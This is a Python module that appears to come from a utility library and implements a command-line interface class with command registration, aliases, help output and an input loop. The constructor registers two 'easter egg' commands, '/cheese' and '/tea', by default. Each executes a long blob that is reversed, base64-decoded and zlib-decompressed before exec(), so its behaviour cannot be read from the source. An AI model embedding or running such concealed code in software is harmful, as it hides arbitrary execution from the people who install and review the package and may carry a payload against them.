import time
import random  # Keep this line for easter eggs.
from typing import List, Callable, Union, Any

from .command_model import CommandModel
from ..logging import HoornLogger
from ..utils import ColorHelper


class CommandLineInterface:
	"""Module to allow for easy implementation of command line interfaces."""

	def __init__(self,
	             logger: HoornLogger,
	             command_prefix: str = "/",
	             initialize_with_help_command: bool = True,
	             exit_command: Callable = exit,
	             log_module_sep: str = "CLI") -> None:
		"""
		Initialize the command line interface.

        :param logger: The logger to use for logging.
        :param command_prefix: The prefix for commands (default is "/").
        :param initialize_with_help_command: Whether to initialize the help command (default is True).
        :param exit_command: The command to call when the user wants to exit (default is exit).
        :param log_module_sep: The separator for logging modules (default is "CLI").
        This is below the module separator root set in the logger.
		"""

		self._logger = logger
		self._command_prefix: str = command_prefix
		self._commands: List[CommandModel] = []
		self._color_helper: ColorHelper = ColorHelper()
		self._exit_requested: bool = False

		if initialize_with_help_command:
			self.add_command(["help", "?"], "Displays this help message.", self.print_help)

		self.add_command(['cheese'], "Easter egg.", self._cheese_command)
		self.add_command(['tea'], "Easter egg.", self._tea_command)
		self.set_exit_command(exit_command)
		self._separator = log_module_sep

		self._logger.debug("Successfully initialized CommandLineInterface", separator=self._separator)

	def _cheese_command(self) -> None:
		_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))

	def _tea_command(self) -> None:
		_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

	def set_exit_command(self, exit_command: Callable):
		keys = ['exit', 'quit', 'q', 'e']

		if not self._command_exists(keys):
			self.add_command(keys, "Quits the application.", exit_command)
		else: self._replace_command(keys, exit_command, [])

	def exit_conversation_loop(self):
		self._exit_requested = True

	def _command_exists(self, keys: List[str]) -> bool:
		altered_keys = [f"{self._command_prefix}{key}" for key in keys]

		for command in self._commands:
			for command_key in command.commands:
				if command_key in altered_keys:
					return True

		return False

	def _command_key_already_existent(self, key: str) -> bool:
		altered_key = f"{self._command_prefix}{key}"

		for command in self._commands:
			if altered_key in command.commands:
				return True

		return False

	def _replace_command(self, keys: List[str], new_action: Callable, new_arguments: List[Any]) -> None:
		altered_keys = [f"{self._command_prefix}{key}" for key in keys]

		for command in self._commands:
			for command_key in command.commands:
				if command_key in altered_keys:
					command.action = new_action
					command.arguments = new_arguments
					return

	def add_command(self, keys: List[str], description: str, action: Callable, arguments: List[Any] = None) -> None:
		"""
		Add a new command to the command line interface.

		:param keys: The keys (aliases) for the command.
		WITHOUT the prefix.
		:param description: A brief description of the command.
		:param action: The function to execute when the command is called.
		:param arguments: The arguments for the command.
		Defaults to None.

		Skips the key if it is duplicate... If none of the keys are unique, it will give an error and not add the key.
		If you want to update an existing command, use the update_command method instead.
		"""

		if self._command_exists(keys):
			self._logger.warning(f"Command with keys {keys} already exists. Skipping.", separator=self._separator)
			return

		filtered_keys = []
		
		for key in keys:
			if not self._command_key_already_existent(key):
				filtered_keys.append(key)
			else: self._logger.warning(f"Command key {key} already exists. Skipping key.", separator=self._separator)

		if len(filtered_keys) <= 0:
			self._logger.error(f"No unique keys found for command. Skipping command.", separator=self._separator)
			return

		command_model = CommandModel(commands=[f"{self._command_prefix}{key}" for key in keys], description=description, action=action, arguments=arguments if arguments is not None else [])
		self._commands.append(command_model)

	def update_command(self, keys: List[str], description: str, action: Callable, arguments: List[Any]) -> None:
		"""
		Update an existing command in the command line interface.

        :param keys: The keys (aliases) for the command.
        :param description: A brief description of the command.
        :param action: The function to execute when the command is called.

        Does nothing if the command does not exist.
        """

		if not self._command_exists(keys):
			self._logger.warning(f"Command with keys {keys} does not exist. Skipping.", separator=self._separator)
			return

		for command in self._commands:
			if command.commands == keys:
				command.description = description
				command.action = action
				command.arguments = arguments
				return

	def add_alias_to_command(self, original_aliases: List[str], added_alias: str) -> None:
		"""
        Add an alias to an existing command.

        :param original_aliases: The original keys (aliases) for the command.
        :param added_alias: The alias to add.

        Does nothing if the original command does not exist.
        """
		altered_keys = [f"{self._command_prefix}{key}" for key in original_aliases]

		if not self._command_exists(original_aliases):
			self._logger.warning(f"Command with keys {original_aliases} does not exist. Skipping.", separator=self._separator)
			return

		for command in self._commands:
			if command.commands == altered_keys:
				command.keys.append(added_alias)
				return

	def start_listen_loop(self):
		self._exit_requested = False

		while not self._exit_requested:
			self._get_user_command()

	def _get_user_command(self):
		user_command: str = input(self._color_helper.colorize_string(">>> ", "#f3ce00"))
		if user_command.startswith(self._command_prefix):
			command: Union[CommandModel, None] = self._find_command_by_key(user_command)

			if command is None:
				self._logger.error(f"Command '{user_command}' not found. Please try again.", separator=self._separator)
				time.sleep(0.1)
				return self._get_user_command()

			command.action(*command.arguments)
			return

		self._logger.error(f"Invalid command '{user_command}'. Please start with '{self._command_prefix}'.", separator=self._separator)

	def get_commands(self) -> List[CommandModel]:
		"""
        Get all the commands in the command line interface.

        :return: A list of CommandModel objects.
        """

		return self._commands

	def print_help(self, print_to_logger_also: bool = False) -> None:
		"""
        Print the help message for all the commands in the command line interface.
        """
		self._commands.sort(key=lambda x: x.commands[0])  # Sort by command key

		for command in self._commands:
			text: str = self._get_formatted_help_message(command.commands, command.description)

			if print_to_logger_also:
				self._logger.info(text)

			print(text)

	def _find_command_by_key(self, key: str) -> Union[CommandModel, None]:
		for command in self._commands:
			if key in command.commands:
				return command

		return None

	def _get_formatted_help_message(self, keys: List[str], description: str) -> str:
		keys_string = self._color_helper.colorize_string(f"| {', '.join(keys)} |", "#2196F3")
		description_string = self._color_helper.colorize_string(f"{description} |", "#795548")
		return f"{keys_string} {description_string}"
